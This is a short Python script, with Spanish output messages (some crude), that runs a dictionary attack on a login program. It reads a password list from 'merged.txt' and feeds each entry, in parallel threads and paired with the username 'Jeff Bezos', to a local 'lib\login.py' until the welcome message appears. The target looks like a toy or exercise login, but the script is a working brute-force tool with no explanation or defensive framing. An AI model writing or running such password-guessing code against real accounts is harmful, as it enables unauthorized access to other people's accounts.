import concurrent.futures
import subprocess
import time

def read_passwords(file_name):
    with open(file_name, "r") as file:
        return [line.strip() for line in file]

start = time.time()

def try_password(usuario, password):
    try:
        p = subprocess.Popen(["python", "lib\\login.py"], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate(input=f"1\n{usuario}\n{password}\n".encode())
        if "Bienvenido al sistema" in out.decode():
            print("Me corrooooo")
            print(f"Usuario: {usuario}\nContraseña: {password}")
            return True
        else:
            print("No me corrooooo")
            p.kill()
            return False
    except Exception as e:
        print("Bueno, paso que: ", e)
        return False

usuario = "Jeff Bezos"
passwordes = read_passwords("merged.txt")

with concurrent.futures.ThreadPoolExecutor() as executor:
    results = [executor.submit(try_password, usuario, password) for password in passwordes]
    for f in concurrent.futures.as_completed(results):
        if f.result():
            break

end = time.time()
total = end - start
print(f"Tiempo total: {total}") 